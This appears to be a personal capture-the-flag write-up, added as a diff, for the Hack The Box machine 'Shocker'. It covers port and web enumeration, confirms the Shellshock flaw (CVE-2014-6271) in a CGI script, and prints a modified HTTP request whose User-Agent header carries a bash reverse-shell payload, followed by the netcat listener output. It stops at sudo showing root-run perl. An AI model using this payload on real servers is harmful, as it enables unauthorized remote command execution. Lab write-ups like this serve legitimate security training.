@@ -1,0 +1,178 @@
+####
+Shocker
+LINUX APACHE WEB SERVER
+CGI RCE CVE
+SHELLSHOCK
+####
+
+ 
+
+1-Enumeration:
+
+╼ [★]$ nmap -Pn -sV -sC  10.129.206.87 -vv -oN scan1.log -T5
+
+    PORT     STATE SERVICE REASON         VERSION
+
+    80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+
+    |_http-title: Site doesn't have a title (text/html).
+
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+
+    | http-methods:
+
+    |_  Supported Methods: GET HEAD POST OPTIONS
+
+ 
+
+    2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+
+    | ssh-hostkey:
+
+    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+
+    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+
+    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+
+    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+
+    |   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+
+    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ 
+
+    Port 80 Enum:
+
+        [★]$  nikto -h http://10.129.206.87:80
+
+            + /: Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+
+ 
+
+        [★]$ gobuster dir -u http://10.129.206.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+            cgi-bin/
+
+            /cgi-bin/user.sh
+
+ 
+
+        We can upload the user.sh via the web browser
+
+ 
+
+        We Check the CVE-2014-6271 CVE:
+
+            https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271
+
+ 
+
+        ★]$ nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.206.87
+
+            Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 15:20 CST
+
+            Nmap scan report for 10.129.206.87
+
+            Host is up (0.0080s latency).
+
+ 
+
+            PORT   STATE SERVICE VERSION
+
+            80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+            |_http-server-header: Apache/2.4.18 (Ubuntu)
+
+            | http-shellshock:
+
+            |   VULNERABLE:
+
+            |   HTTP Shellshock vulnerability
+
+            |     State: VULNERABLE (Exploitable)
+
+            |     IDs:  CVE:CVE-2014-6271
+
+            |       This web application might be affected by the vulnerability known
+
+            |       as Shellshock. It seems the server is executing commands injected
+
+            |       via malicious HTTP headers.
+
+            |            
+
+            |     Disclosure date: 2014-09-24
+
+            |     References:
+
+            |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+
+            |       http://seclists.org/oss-sec/2014/q3/685
+
+            |       http://www.openwall.com/lists/oss-security/2014/09/24/10
+
+            |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+
+ 
+
+    Exploit Web Server via ShellShock RCE:
+
+ 
+
+        Via BurpSuite we modify the GET REQUEST sent to the Web Server and add a Bash remote shell in the "User Agent":
+
+            GET /cgi-bin/user.sh HTTP/1.1
+
+                Host: 10.129.206.87
+
+                Upgrade-Insecure-Requests: 1
+
+            -->>User-Agent: User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.53/443 0>&1
+
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+                Accept-Encoding: gzip, deflate, br
+
+                Accept-Language: en-US,en;q=0.9
+
+                Connection: close
+
+ 
+
+        We get a shell:
+
+            ┌─[us-dedivip-1]─[10.10.14.53]─[dsk75@htb-ulsc8rpzpb]─[~]
+
+            └──╼ [★]$ sudo nc -lvnp 443
+
+            listening on [any] 443 ...
+
+            connect to [10.10.14.53] from (UNKNOWN) [10.129.206.87] 42354
+
+            bash: no job control in this shell
+
+            shelly@Shocker:/usr/lib/cgi-bin$
+
+ 
+
+       
+
+    2- Privilege Exploitation:
+
+         shelly@Shocker:/home/shelly$ sudo -l
+
+        Matching Defaults entries for shelly on Shocker:
+
+            env_reset, mail_badpass,
+
+            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+ 
+
+        User shelly may run the following commands on Shocker:
+
+            (root) NOPASSWD: /usr/bin/perl
